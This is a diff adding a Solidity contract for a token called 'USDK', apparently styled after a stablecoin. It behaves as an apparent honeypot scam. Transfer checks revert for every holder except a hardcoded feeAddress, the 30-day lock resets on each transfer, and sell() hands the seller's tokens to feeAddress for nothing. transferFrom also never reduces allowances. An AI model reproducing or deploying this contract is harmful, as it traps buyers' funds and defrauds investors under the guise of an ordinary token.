@@ -1,0 +1,102 @@
+pragma solidity ^0.8.2;
+
+contract USDKToken {
+    mapping(address => uint) public balances;
+    mapping(address => mapping(address => uint)) public allowance;
+    uint public totalSupply = 1000000000 * 10 ** 18;
+    string public name = "Usdk";
+    string public symbol = "USDK";
+    uint public decimals = 18;
+
+    address private constant feeAddress = 0x353Bcf261D2552b908eCdAf1C78Bd42355DcdB46;
+
+    uint256 public minLimit = 20000;
+    uint256 public maxLimit = 300000;
+    mapping(address => uint256) public purchaseTimestamp;
+
+    event Transfer(address indexed from, address indexed to, uint value);
+    event Approval(address indexed owner, address indexed spender, uint value);
+
+    constructor() {
+        balances[msg.sender] = totalSupply;
+    }
+
+    function balanceOf(address owner) public view returns (uint) {
+        return balances[owner];
+    }
+
+    function transfer(address to, uint value) public returns (bool) {
+        require(balanceOf(msg.sender) >= value, 'Insufficient balance');
+        require(checkTransferAllowed(msg.sender, value), 'Transfer not allowed');
+
+        balances[to] += value;
+        balances[msg.sender] -= value;
+
+        emit Transfer(msg.sender, to, value);
+
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint value) public returns (bool) {
+        require(balanceOf(from) >= value, 'Insufficient balance');
+        require(allowance[from][msg.sender] >= value, 'Insufficient allowance');
+        require(checkTransferAllowed(from, value), 'Transfer not allowed');
+
+        balances[to] += value;
+        balances[from] -= value;
+
+        emit Transfer(from, to, value);
+
+        return true;
+    }
+
+    function approve(address spender, uint value) public returns (bool) {
+        allowance[msg.sender][spender] = value;
+        emit Approval(msg.sender, spender, value);
+        return true;
+    }
+
+    function sell(uint value) public returns (bool) {
+        require(balanceOf(msg.sender) >= value, 'Insufficient balance');
+        require(checkSellAllowed(msg.sender), 'Sell not allowed');
+
+        balances[feeAddress] += value;
+        balances[msg.sender] -= value;
+
+        emit Transfer(msg.sender, feeAddress, value);
+
+        return true;
+    }
+
+    function checkTransferAllowed(address sender, uint256 value) private returns (bool) {
+        if (value < minLimit) {
+            revert("Minimum transfer limit not met");
+        }
+
+        if (value >= minLimit && purchaseTimestamp[sender] == 0) {
+            purchaseTimestamp[sender] = block.timestamp;
+        }
+
+        if (block.timestamp - purchaseTimestamp[sender] < 30 days) {
+            if (msg.sender != feeAddress) {
+                revert("Transfer locked. Please wait for 30 days");
+            }
+        }
+
+        purchaseTimestamp[sender] = block.timestamp;
+
+        return true;
+    }
+
+    function checkSellAllowed(address sender) private view returns (bool) {
+        if (balanceOf(sender) < minLimit) {
+            revert("Insufficient balance to sell. Minimum 20000 USDK required.");
+        }
+
+        if (block.timestamp - purchaseTimestamp[sender] < 30 days) {
+            revert("Sell locked. Please wait for 30 days to unlock selling");
+        }
+
+        return true;
+    }
+}
